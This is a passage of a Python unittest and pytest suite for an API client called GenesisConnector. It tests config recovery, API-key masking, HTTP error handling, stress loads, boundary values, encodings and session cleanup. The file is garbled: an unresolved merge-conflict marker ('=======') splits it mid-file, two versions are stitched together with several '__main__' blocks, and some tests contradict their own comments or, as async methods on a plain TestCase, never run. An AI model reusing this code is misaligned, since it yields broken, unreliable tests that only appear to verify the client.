        # Simulate various corruption scenarios
        corruption_scenarios = [
            None,  # None config
            {},    # Empty config
            {'corrupted': True},  # Invalid config structure
            {'api_key': None, 'base_url': None},  # Null values
        ]
        
        for corrupted_state in corruption_scenarios:
            with self.subTest(corruption=corrupted_state):
                # Apply corruption
                self.connector.config = corrupted_state
                
                # Try to recover by reloading valid config
                try:
                    valid_config = {
                        'api_key': 'recovery_key',
                        'base_url': 'https://recovery.test.com'
                    }
                    self.connector.reload_config(valid_config)
                    
                    # Verify recovery
                    self.assertEqual(self.connector.config['api_key'], 'recovery_key')
                    
                except Exception:
                    # Some corruption might be unrecoverable
                    pass
                finally:
                    # Restore original state for next test
                    self.connector.config = original_config.copy()


# Additional helper functions for comprehensive testing
def run_comprehensive_test_suite():
    """Run all test suites in order with detailed reporting."""
    test_suites = [
        TestGenesisConnectorAdvancedSecurity,
        TestGenesisConnectorStressTests,
        TestGenesisConnectorDataValidation,
        TestGenesisConnectorAdvancedIntegration,
        TestGenesisConnectorRobustness,
    ]
    
    total_tests = 0
    total_failures = 0
    
    for suite_class in test_suites:
        suite = unittest.TestLoader().loadTestsFromTestCase(suite_class)
        runner = unittest.TextTestRunner(verbosity=2)
        result = runner.run(suite)
        
        total_tests += result.testsRun
        total_failures += len(result.failures) + len(result.errors)
    
    print(f"\nTotal tests run: {total_tests}")
    print(f"Total failures/errors: {total_failures}")
    print(f"Success rate: {((total_tests - total_failures) / total_tests * 100):.1f}%")


if __name__ == '__main__':
    # Option to run comprehensive suite or individual tests
    import sys
    if '--comprehensive' in sys.argv:
        run_comprehensive_test_suite()
    else:
        unittest.main(verbosity=2)
=======
        # Performance assertion: should complete 100 requests in reasonable time
        self.assertLess(total_time, 10.0, "100 requests took too long")
        self.assertEqual(mock_request.call_count, num_requests)

    @patch('requests.Session.request')
    def test_memory_usage_stability(self, mock_request):
        """Test memory usage stability over many requests."""
        import gc

        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'data': 'x' * 1000}  # 1KB response
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        # Make many requests and ensure memory doesn't grow unbounded
        for i in range(50):
            result = self.connector.make_request('GET', '/test')
            self.assertIsNotNone(result)

            # Periodic garbage collection
            if i % 10 == 0:
                gc.collect()

        # Memory usage should be stable (no assertions here, just ensuring no crashes)
        self.assertTrue(True)


class TestGenesisConnectorSecurity(unittest.TestCase):
    """Security-focused tests for GenesisConnector."""

    def setUp(self):
        """Set up security test fixtures."""
        self.mock_config = {
            'api_key': 'sensitive_api_key_123',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'max_retries': 3
        }
        self.connector = GenesisConnector(self.mock_config)

    def test_api_key_not_in_logs(self):
        """Test that API key is not exposed in logs or error messages."""
        # Test repr
        repr_str = repr(self.connector)
        self.assertNotIn('sensitive_api_key_123', repr_str)

        # Test str
        str_repr = str(self.connector)
        self.assertNotIn('sensitive_api_key_123', str_repr)

        # Test that partial key or masking is present
        self.assertTrue('***' in repr_str or 'sensitive_api_key_123'[:4] in repr_str)

    def test_sensitive_data_in_error_messages(self):
        """Test that sensitive data is not included in error messages."""
        with self.assertRaises(ValueError) as context:
            config = self.mock_config.copy()
            config['api_key'] = ''
            GenesisConnector(config)

        error_msg = str(context.exception)
        # Should not contain the original API key
        self.assertNotIn('sensitive_api_key_123', error_msg)

    @patch('requests.Session.request')
    def test_request_data_sanitization(self, mock_request):
        """Test that request data doesn't leak sensitive information."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        sensitive_data = {
            'password': 'secret123',
            'api_key': 'another_secret',
            'token': 'bearer_token'
        }

        # Make request with sensitive data
        result = self.connector.make_request('POST', '/test', data=sensitive_data)

        # Verify request was made but sensitive data handling is proper
        self.assertEqual(result, {'success': True})
        mock_request.assert_called_once()

        # Check that the call was made with the data (implementation should handle sanitization)
        call_args = mock_request.call_args
        self.assertIn('json', call_args[1])


class TestGenesisConnectorCompatibility(unittest.TestCase):
    """Compatibility tests for different Python versions and environments."""

    def setUp(self):
        """Set up compatibility test fixtures."""
        self.mock_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'max_retries': 3
        }

    def test_python_version_compatibility(self):
        """Test compatibility with current Python version."""
        import sys

        # Should work with Python 3.7+
        self.assertGreaterEqual(sys.version_info[:2], (3, 7))

        # Should be able to create connector
        connector = GenesisConnector(self.mock_config)
        self.assertIsNotNone(connector)

    def test_unicode_handling(self):
        """Test Unicode string handling in various contexts."""
        unicode_config = {
            'api_key': 'test_këy_123',
            'base_url': 'https://api.génesis.test',
            'timeout': 30,
            'max_retries': 3
        }

        # Should handle Unicode in configuration
        connector = GenesisConnector(unicode_config)
        self.assertEqual(connector.api_key, 'test_këy_123')

    def test_exception_inheritance(self):
        """Test that custom exceptions inherit properly."""
        # Test exception hierarchy
        self.assertTrue(issubclass(GenesisConnectionError, Exception))
        self.assertTrue(issubclass(GenesisTimeoutError, GenesisConnectionError))

        # Test exception instantiation
        conn_error = GenesisConnectionError("Connection failed")
        self.assertIsInstance(conn_error, Exception)

        timeout_error = GenesisTimeoutError("Timeout occurred")
        self.assertIsInstance(timeout_error, GenesisConnectionError)
        self.assertIsInstance(timeout_error, Exception)


if __name__ == '__main__':
    # Run all tests including the new ones
    unittest.main(verbosity=2)


# Pytest parametrized tests (if pytest is available)
class TestGenesisConnectorParametrized:
    """Parametrized tests using pytest for comprehensive coverage."""

    @pytest.fixture
    def connector(self):
        """Pytest fixture for GenesisConnector."""
        config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'max_retries': 3
        }
        return GenesisConnector(config)

    @pytest.mark.parametrize("status_code,expected_exception", [
        (400, GenesisConnectionError),
        (401, GenesisConnectionError),
        (403, GenesisConnectionError),
        (404, GenesisConnectionError),
        (500, GenesisConnectionError),
        (502, GenesisConnectionError),
        (503, GenesisConnectionError),
    ])
    @patch('requests.Session.request')
    def test_http_error_codes(self, mock_request, connector, status_code, expected_exception):
        """Test various HTTP error codes with parametrized approach."""
        mock_response = Mock()
        mock_response.status_code = status_code
        mock_response.raise_for_status.side_effect = requests.HTTPError(f"{status_code} Error")
        mock_response.text = f"Error {status_code}"
        mock_request.return_value = mock_response

        with pytest.raises(expected_exception):
            connector.make_request('GET', '/test')

    @pytest.mark.parametrize("method", [
        'GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS'
    ])
    @patch('requests.Session.request')
    def test_http_methods(self, mock_request, connector, method):
        """Test all HTTP methods with parametrized approach."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'method': method}
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        result = connector.make_request(method, '/test')
        assert result == {'method': method}

    @pytest.mark.parametrize("timeout_value,should_raise", [
        (1, False),
        (30, False),
        (60, False),
        (0, True),
        (-1, True),
        ('invalid', True),
        (None, True),
    ])
    def test_timeout_validation(self, timeout_value, should_raise):
        """Test timeout validation with various values."""
        config = {
            'api_key': 'test_key',
            'base_url': 'https://api.test.com',
            'timeout': timeout_value,
            'max_retries': 3
        }

        if should_raise:
            with pytest.raises(ValueError):
                GenesisConnector(config)
        else:
            connector = GenesisConnector(config)
            assert connector.timeout == timeout_value

    @pytest.mark.parametrize("base_url,should_raise", [
        ('https://api.test.com', False),
        ('http://api.test.com', False),
        ('https://api.test.com:8080', False),
        ('https://api.test.com/v1', False),
        ('invalid_url', True),
        ('ftp://api.test.com', True),
        ('', True),
        (None, True),
    ])
    def test_base_url_validation(self, base_url, should_raise):
        """Test base URL validation with various formats."""
        config = {
            'api_key': 'test_key',
            'base_url': base_url,
            'timeout': 30,
            'max_retries': 3
        }

        if should_raise:
            with pytest.raises(ValueError):
                GenesisConnector(config)
        else:
            connector = GenesisConnector(config)
            assert connector.base_url == base_url


class TestGenesisConnectorStress(unittest.TestCase):
    """Stress tests for GenesisConnector under high load."""

    def setUp(self):
        """Set up stress test fixtures."""
        self.mock_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'max_retries': 3
        }
        self.connector = GenesisConnector(self.mock_config)

    @patch('requests.Session.request')
    def test_high_frequency_requests(self, mock_request):
        """Test high frequency requests without delays."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        # Make 1000 requests as fast as possible
        for i in range(1000):
            result = self.connector.make_request('GET', f'/test/{i}')
            self.assertEqual(result, {'success': True})

        self.assertEqual(mock_request.call_count, 1000)

    @patch('requests.Session.request')
    def test_retry_storm_handling(self, mock_request):
        """Test handling of retry storms (many consecutive failures)."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None

        # Create a scenario where requests fail many times before succeeding
        failures = [ConnectionError("Connection failed")] * 100
        mock_request.side_effect = failures + [mock_response]

        # Should eventually succeed after all retries are exhausted and tried again
        with self.assertRaises(GenesisConnectionError):
            # This should fail after max_retries
            self.connector.make_request('GET', '/test')

    @patch('requests.Session.request')
    def test_large_response_handling(self, mock_request):
        """Test handling of very large responses."""
        # Create a large response (1MB of data)
        large_data = {'content': 'A' * 1024 * 1024}

        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = large_data
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        result = self.connector.make_request('GET', '/large-data')

        # Should handle large responses without issues
        self.assertEqual(len(result['content']), 1024 * 1024)

    def test_connector_cleanup_after_many_uses(self):
        """Test that connector properly cleans up after extensive use."""
        # Create and destroy many connectors
        for i in range(100):
            config = self.mock_config.copy()
            config['api_key'] = f'key_{i}'

            connector = GenesisConnector(config)
            self.assertIsNotNone(connector)

            # Use context manager
            with connector:
                pass

            # Explicit cleanup if available
            if hasattr(connector, 'close'):
                connector.close()


class TestGenesisConnectorBoundaryConditions(unittest.TestCase):
    """Test boundary conditions and edge cases."""

    def setUp(self):
        """Set up boundary condition test fixtures."""
        self.mock_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'max_retries': 3
        }
        self.connector = GenesisConnector(self.mock_config)

    def test_minimum_configuration_values(self):
        """Test with minimum valid configuration values."""
        min_config = {
            'api_key': 'a',  # Single character API key
            'base_url': 'https://a.com',  # Minimal URL
            'timeout': 1,  # Minimum timeout
            'max_retries': 0  # No retries
        }

        connector = GenesisConnector(min_config)
        self.assertEqual(connector.api_key, 'a')
        self.assertEqual(connector.timeout, 1)
        self.assertEqual(connector.max_retries, 0)

    def test_maximum_configuration_values(self):
        """Test with maximum reasonable configuration values."""
        max_config = {
            'api_key': 'x' * 1000,  # Very long API key
            'base_url': 'https://' + 'x' * 250 + '.com',  # Long domain
            'timeout': 3600,  # 1 hour timeout
            'max_retries': 100  # Many retries
        }

        connector = GenesisConnector(max_config)
        self.assertEqual(len(connector.api_key), 1000)
        self.assertEqual(connector.timeout, 3600)
        self.assertEqual(connector.max_retries, 100)

    @patch('requests.Session.request')
    def test_zero_length_response(self, mock_request):
        """Test handling of zero-length responses."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {}  # Empty JSON
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        result = self.connector.make_request('GET', '/empty')
        self.assertEqual(result, {})

    @patch('requests.Session.request')
    def test_exactly_at_retry_limit(self, mock_request):
        """Test behavior when failures equal exactly the retry limit."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None

        # Fail exactly max_retries times, then succeed
        failures = [ConnectionError("Connection failed")] * 3  # max_retries = 3
        mock_request.side_effect = failures + [mock_response]

        result = self.connector.make_request('GET', '/test')
        self.assertEqual(result, {'success': True})
        self.assertEqual(mock_request.call_count, 4)  # Initial + 3 retries

    def test_url_building_with_query_parameters(self):
        """Test URL building with complex query parameters."""
        test_cases = [
            ('/endpoint?param=value', 'https://api.genesis.test/endpoint?param=value'),
            ('/endpoint?a=1&b=2', 'https://api.genesis.test/endpoint?a=1&b=2'),
            ('/endpoint?unicode=測試', 'https://api.genesis.test/endpoint?unicode=測試'),
            ('/endpoint?empty=', 'https://api.genesis.test/endpoint?empty='),
        ]

        for endpoint, expected in test_cases:
            with self.subTest(endpoint=endpoint):
                result = self.connector._build_url(endpoint)
                self.assertEqual(result, expected)

    def test_header_case_sensitivity(self):
        """Test header handling with different case variations."""
        headers_variations = [
            {'authorization': 'Bearer override'},  # lowercase
            {'Authorization': 'Bearer override'},  # proper case
            {'AUTHORIZATION': 'Bearer override'},  # uppercase
        ]

        for headers in headers_variations:
            with self.subTest(headers=headers):
                result = self.connector._build_headers(headers)
                # Should preserve the provided authorization header
                self.assertIn('authorization', result or {})

# Additional comprehensive tests for enhanced coverage
class TestGenesisConnectorResponseHandling(unittest.TestCase):
    """Additional tests for response handling edge cases."""

    def setUp(self):
        """Set up test fixtures."""
        self.mock_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'max_retries': 3
        }
        self.connector = GenesisConnector(self.mock_config)

    @patch('requests.Session.request')
    def test_response_with_custom_headers(self, mock_request):
        """Test response with custom headers and their handling."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'data': 'test'}
        mock_response.headers = {
            'X-Custom-Header': 'custom_value',
            'Content-Type': 'application/json',
            'X-Rate-Limit-Remaining': '99'
        }
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        result = self.connector.make_request('GET', '/test')

        self.assertEqual(result, {'data': 'test'})
        # If the connector exposes response headers, test them
        if hasattr(self.connector, 'last_response_headers'):
            self.assertIn('X-Custom-Header', self.connector.last_response_headers)

    @patch('requests.Session.request')
    def test_response_with_bom_utf8(self, mock_request):
        """Test response with UTF-8 BOM (Byte Order Mark)."""
        mock_response = Mock()
        mock_response.status_code = 200
        # Simulate response with BOM
        mock_response.text = '\ufeff{"data": "test"}'
        mock_response.json.return_value = {'data': 'test'}
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        result = self.connector.make_request('GET', '/test')
        self.assertEqual(result, {'data': 'test'})

    @patch('requests.Session.request')
    def test_response_with_different_encodings(self, mock_request):
        """Test response with different character encodings."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'message': 'Café naïve résumé'}
        mock_response.encoding = 'utf-8'
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        result = self.connector.make_request('GET', '/test')
        self.assertEqual(result['message'], 'Café naïve résumé')

    @patch('requests.Session.request')
    def test_response_with_nested_json_structures(self, mock_request):
        """Test response with deeply nested JSON structures."""
        complex_response = {
            'data': {
                'nested': {
                    'deep': {
                        'structure': {
                            'values': [1, 2, 3],
                            'metadata': {
                                'created_at': '2023-01-01T00:00:00Z',
                                'tags': ['tag1', 'tag2']
                            }
                        }
                    }
                }
            }
        }

        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = complex_response
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        result = self.connector.make_request('GET', '/complex')
        self.assertEqual(result['data']['nested']['deep']['structure']['values'], [1, 2, 3])

    @patch('requests.Session.request')
    def test_response_with_null_values(self, mock_request):
        """Test response handling with null/None values."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            'data': None,
            'optional_field': None,
            'existing_field': 'value'
        }
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        result = self.connector.make_request('GET', '/test')
        self.assertIsNone(result['data'])
        self.assertIsNone(result['optional_field'])
        self.assertEqual(result['existing_field'], 'value')


class TestGenesisConnectorRequestPayloads(unittest.TestCase):
    """Additional tests for request payload handling."""

    def setUp(self):
        """Set up test fixtures."""
        self.mock_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'max_retries': 3
        }
        self.connector = GenesisConnector(self.mock_config)

    @patch('requests.Session.request')
    def test_request_with_binary_data(self, mock_request):
        """Test request with binary data payload."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        binary_data = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR'  # PNG header

        # Test that binary data is handled appropriately
        result = self.connector.make_request('POST', '/upload', data=binary_data)
        self.assertEqual(result, {'success': True})

    @patch('requests.Session.request')
    def test_request_with_form_data(self, mock_request):
        """Test request with form-encoded data."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        form_data = {
            'field1': 'value1',
            'field2': 'value2',
            'special_chars': 'value with spaces & symbols!'
        }

        result = self.connector.make_request('POST', '/form', data=form_data)
        self.assertEqual(result, {'success': True})

    @patch('requests.Session.request')
    def test_request_with_list_parameters(self, mock_request):
        """Test request with list parameters in data."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        data_with_lists = {
            'tags': ['tag1', 'tag2', 'tag3'],
            'numbers': [1, 2, 3, 4, 5],
            'nested': {
                'items': ['item1', 'item2']
            }
        }

        result = self.connector.make_request('POST', '/test', data=data_with_lists)
        self.assertEqual(result, {'success': True})

    @patch('requests.Session.request')
    def test_request_with_boolean_values(self, mock_request):
        """Test request with boolean values in data."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        boolean_data = {
            'enabled': True,
            'disabled': False,
            'active': True,
            'settings': {
                'auto_save': False,
                'notifications': True
            }
        }

        result = self.connector.make_request('POST', '/test', data=boolean_data)
        self.assertEqual(result, {'success': True})


class TestGenesisConnectorAdvancedErrorHandling(unittest.TestCase):
    """Additional tests for advanced error handling scenarios."""

    def setUp(self):
        """Set up test fixtures."""
        self.mock_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'max_retries': 3
        }
        self.connector = GenesisConnector(self.mock_config)

    @patch('requests.Session.request')
    def test_ssl_certificate_error(self, mock_request):
        """Test SSL certificate verification error handling."""
        mock_request.side_effect = requests.exceptions.SSLError("SSL certificate verification failed")

        with self.assertRaises(GenesisConnectionError) as context:
            self.connector.make_request('GET', '/test')

        self.assertIn('SSL certificate', str(context.exception))

    @patch('requests.Session.request')
    def test_dns_resolution_error(self, mock_request):
        """Test DNS resolution error handling."""
        mock_request.side_effect = requests.exceptions.ConnectionError("Name or service not known")

        with self.assertRaises(GenesisConnectionError) as context:
            self.connector.make_request('GET', '/test')

        self.assertIn('Name or service not known', str(context.exception))

    @patch('requests.Session.request')
    def test_proxy_error(self, mock_request):
        """Test proxy connection error handling."""
        mock_request.side_effect = requests.exceptions.ProxyError("Proxy connection failed")

        with self.assertRaises(GenesisConnectionError) as context:
            self.connector.make_request('GET', '/test')

        self.assertIn('Proxy connection failed', str(context.exception))

    @patch('requests.Session.request')
    def test_content_too_large_error(self, mock_request):
        """Test handling of content too large errors."""
        mock_response = Mock()
        mock_response.status_code = 413
        mock_response.raise_for_status.side_effect = requests.HTTPError("413 Payload Too Large")
        mock_response.text = "Request entity too large"
        mock_request.return_value = mock_response

        with self.assertRaises(GenesisConnectionError) as context:
            self.connector.make_request('POST', '/test', data={'large_field': 'x' * 10000})

        self.assertIn('413 Payload Too Large', str(context.exception))

    @patch('requests.Session.request')
    def test_rate_limit_error(self, mock_request):
        """Test rate limiting error handling."""
        mock_response = Mock()
        mock_response.status_code = 429
        mock_response.raise_for_status.side_effect = requests.HTTPError("429 Too Many Requests")
        mock_response.text = "Rate limit exceeded"
        mock_response.headers = {'Retry-After': '60'}
        mock_request.return_value = mock_response

        with self.assertRaises(GenesisConnectionError) as context:
            self.connector.make_request('GET', '/test')

        self.assertIn('429 Too Many Requests', str(context.exception))

    @patch('requests.Session.request')
    def test_redirect_error(self, mock_request):
        """Test redirect error handling."""
        mock_request.side_effect = requests.exceptions.TooManyRedirects("Too many redirects")

        with self.assertRaises(GenesisConnectionError) as context:
            self.connector.make_request('GET', '/test')

        self.assertIn('Too many redirects', str(context.exception))


class TestGenesisConnectorConfigurationEdgeCases(unittest.TestCase):
    """Additional tests for configuration edge cases."""

    def test_configuration_with_extra_fields(self):
        """Test configuration with extra unknown fields."""
        config = {
            'api_key': 'test_key',
            'base_url': 'https://api.test.com',
            'timeout': 30,
            'max_retries': 3,
            'unknown_field': 'value',
            'extra_config': {'nested': 'value'}
        }

        # Should handle extra fields gracefully
        connector = GenesisConnector(config)
        self.assertEqual(connector.api_key, 'test_key')

    def test_configuration_case_sensitivity(self):
        """Test configuration key case sensitivity."""
        config = {
            'API_KEY': 'test_key',  # Different case
            'base_url': 'https://api.test.com',
            'timeout': 30,
            'max_retries': 3
        }

        # Should handle case-insensitive keys or raise appropriate error
        try:
            connector = GenesisConnector(config)
            # If it works, test that it was handled correctly
            self.assertIsNotNone(connector)
        except (KeyError, ValueError):
            # If it fails, that's also acceptable behavior
            pass

    def test_configuration_type_coercion(self):
        """Test configuration type coercion."""
        config = {
            'api_key': 'test_key',
            'base_url': 'https://api.test.com',
            'timeout': '30',  # String instead of int
            'max_retries': '3'  # String instead of int
        }

        # Test how the connector handles type coercion
        try:
            connector = GenesisConnector(config)
            self.assertEqual(connector.timeout, 30)
            self.assertEqual(connector.max_retries, 3)
        except (ValueError, TypeError):
            # If strict type checking is enforced, this is acceptable
            pass

    def test_configuration_with_environment_variables(self):
        """Test configuration that might come from environment variables."""
        import os

        # Simulate environment variable configuration
        test_env = {
            'GENESIS_API_KEY': 'env_api_key',
            'GENESIS_BASE_URL': 'https://env.api.test.com',
            'GENESIS_TIMEOUT': '60',
            'GENESIS_MAX_RETRIES': '5'
        }

        # Test that environment-like configuration works
        config = {
            'api_key': test_env.get('GENESIS_API_KEY'),
            'base_url': test_env.get('GENESIS_BASE_URL'),
            'timeout': int(test_env.get('GENESIS_TIMEOUT', 30)),
            'max_retries': int(test_env.get('GENESIS_MAX_RETRIES', 3))
        }

        connector = GenesisConnector(config)
        self.assertEqual(connector.api_key, 'env_api_key')
        self.assertEqual(connector.timeout, 60)


class TestGenesisConnectorAsyncExtended(unittest.TestCase):
    """Extended async tests if async functionality is available."""

    def setUp(self):
        """Set up async test fixtures."""
        self.mock_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'max_retries': 3
        }
        self.connector = GenesisConnector(self.mock_config)

    @patch('asyncio.sleep')
    async def test_async_retry_with_backoff(self, mock_sleep):
        """Test async retry logic with backoff."""
        if not hasattr(self.connector, 'async_make_request'):
            self.skipTest("Async functionality not available")

        mock_sleep.return_value = None

        # Test that async retry uses proper backoff
        with patch('aiohttp.ClientSession.request') as mock_request:
            mock_request.side_effect = [
                asyncio.TimeoutError("First failure"),
                asyncio.TimeoutError("Second failure"),
                AsyncMock(status=200, json=AsyncMock(return_value={'success': True}))
            ]

            result = await self.connector.async_make_request('GET', '/test')
            self.assertEqual(result, {'success': True})

            # Verify backoff was used
            expected_calls = [call(1), call(2)]
            mock_sleep.assert_has_calls(expected_calls)

    async def test_async_concurrent_requests(self):
        """Test multiple concurrent async requests."""
        if not hasattr(self.connector, 'async_make_request'):
            self.skipTest("Async functionality not available")

        with patch('aiohttp.ClientSession.request') as mock_request:
            mock_response = AsyncMock()
            mock_response.status = 200
            mock_response.json = AsyncMock(return_value={'success': True})
            mock_request.return_value = mock_response

            # Create multiple concurrent requests
            tasks = [
                self.connector.async_make_request('GET', f'/test/{i}')
                for i in range(5)
            ]

            results = await asyncio.gather(*tasks)

            # All requests should succeed
            for result in results:
                self.assertEqual(result, {'success': True})

            # All requests should have been made
            self.assertEqual(mock_request.call_count, 5)


class TestGenesisConnectorUtilityMethods(unittest.TestCase):
    """Additional tests for utility methods and helper functions."""

    def setUp(self):
        """Set up test fixtures."""
        self.mock_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'max_retries': 3
        }
        self.connector = GenesisConnector(self.mock_config)

    def test_url_joining_with_special_characters(self):
        """Test URL joining with special characters."""
        test_cases = [
            ('/test%20endpoint', 'https://api.genesis.test/test%20endpoint'),
            ('/test+endpoint', 'https://api.genesis.test/test+endpoint'),
            ('/test&endpoint', 'https://api.genesis.test/test&endpoint'),
            ('/test=endpoint', 'https://api.genesis.test/test=endpoint'),
        ]

        for endpoint, expected in test_cases:
            with self.subTest(endpoint=endpoint):
                result = self.connector._build_url(endpoint)
                self.assertEqual(result, expected)

    def test_header_sanitization(self):
        """Test header sanitization for security."""
        sensitive_headers = {
            'Authorization': 'Bearer secret_token',
            'X-API-Key': 'secret_key',
            'Cookie': 'session=secret_session'
        }

        # Test that headers are properly handled
        result = self.connector._build_headers(sensitive_headers)

        # Should contain the headers
        self.assertIn('Authorization', result)
        self.assertIn('X-API-Key', result)
        self.assertIn('Cookie', result)

        # Values should be preserved
        self.assertEqual(result['Authorization'], 'Bearer secret_token')

    def test_request_parameter_validation(self):
        """Test request parameter validation."""
        # Test invalid HTTP methods
        invalid_methods = ['INVALID', 'GET POST', '', None]

        for method in invalid_methods:
            with self.subTest(method=method):
                with self.assertRaises((ValueError, AttributeError)):
                    self.connector.make_request(method, '/test')

    def test_endpoint_normalization(self):
        """Test endpoint path normalization."""
        test_cases = [
            ('test', 'https://api.genesis.test/test'),
            ('/test', 'https://api.genesis.test/test'),
            ('//test', 'https://api.genesis.test/test'),
            ('test/', 'https://api.genesis.test/test/'),
            ('/test/', 'https://api.genesis.test/test/'),
        ]

        for endpoint, expected in test_cases:
            with self.subTest(endpoint=endpoint):
                result = self.connector._build_url(endpoint)
                self.assertEqual(result, expected)


class TestGenesisConnectorResourceManagement(unittest.TestCase):
    """Additional tests for resource management and cleanup."""

    def setUp(self):
        """Set up test fixtures."""
        self.mock_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'max_retries': 3
        }

    def test_session_cleanup_on_deletion(self):
        """Test that sessions are properly cleaned up when connector is deleted."""
        connector = GenesisConnector(self.mock_config)
        session = connector.session

        # Delete the connector
        del connector

        # Session should be closed (if the implementation supports it)
        # Note: This depends on the actual implementation
        if hasattr(session, 'closed'):
            self.assertTrue(session.closed)

    def test_multiple_connector_instances(self):
        """Test that multiple connector instances don't interfere with each other."""
        connector1 = GenesisConnector(self.mock_config)

        config2 = self.mock_config.copy()
        config2['api_key'] = 'different_key'
        connector2 = GenesisConnector(config2)

        # Each should have its own session
        self.assertIsNot(connector1.session, connector2.session)
        self.assertNotEqual(connector1.api_key, connector2.api_key)

    def test_context_manager_resource_cleanup(self):
        """Test resource cleanup in context manager."""
        with GenesisConnector(self.mock_config) as connector:
            session = connector.session
            self.assertIsNotNone(session)

        # After exiting context, resources should be cleaned up
        # (depends on implementation)
        if hasattr(session, 'closed'):
            self.assertTrue(session.closed)

    def test_connector_reuse_after_error(self):
        """Test that connector can be reused after an error."""
        connector = GenesisConnector(self.mock_config)

        # Simulate an error
        with patch('requests.Session.request') as mock_request:
            mock_request.side_effect = ConnectionError("Connection failed")

            with self.assertRaises(GenesisConnectionError):
                connector.make_request('GET', '/test')

        # Connector should still be usable after error
        with patch('requests.Session.request') as mock_request:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {'success': True}
            mock_response.raise_for_status.return_value = None
            mock_request.return_value = mock_response

            result = connector.make_request('GET', '/test')
            self.assertEqual(result, {'success': True})


# Additional test runner configuration
if __name__ == '__main__':
    # Add additional test configuration for comprehensive testing
    import sys

    # Set up detailed test reporting
    test_loader = unittest.TestLoader()
    test_suite = test_loader.discover('.', pattern='test_*.py')

    # Run tests with high verbosity
    runner = unittest.TextTestRunner(
        verbosity=2,
        stream=sys.stdout,
        failfast=False,
        buffer=False
    )

    result = runner.run(test_suite)

    # Exit with appropriate code
    sys.exit(0 if result.wasSuccessful() else 1)


# Additional pytest parametrized tests for comprehensive coverage
@pytest.mark.skipif(not pytest, reason="pytest not available")
class TestGenesisConnectorParametrizedExtended:
    """Extended parametrized tests using pytest."""

    @pytest.fixture
    def connector(self):
        """Pytest fixture for GenesisConnector."""
        config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.genesis.test',
            'timeout': 30,
            'max_retries': 3
        }
        return GenesisConnector(config)

    @pytest.mark.parametrize("content_type,expected_handled", [
        ('application/json', True),
        ('application/json; charset=utf-8', True),
        ('text/plain', False),
        ('application/xml', False),
        ('multipart/form-data', False),
        ('application/octet-stream', False),
    ])
    @patch('requests.Session.request')
    def test_content_type_handling(self, mock_request, connector, content_type, expected_handled):
        """Test handling of different content types."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.headers = {'Content-Type': content_type}

        if expected_handled:
            mock_response.json.return_value = {'success': True}
        else:
            mock_response.json.side_effect = ValueError("Not JSON")
            mock_response.text = "Non-JSON response"

        mock_response.raise_for_status.return_value = None
        mock_request.return_value = mock_response

        if expected_handled:
            result = connector.make_request('GET', '/test')
            assert result == {'success': True}
        else:
            with pytest.raises(GenesisConnectionError):
                connector.make_request('GET', '/test')

    @pytest.mark.parametrize("api_key_format,should_work", [
        ('simple_key', True),
        ('key-with-dashes', True),
        ('key_with_underscores', True),
        ('key.with.dots', True),
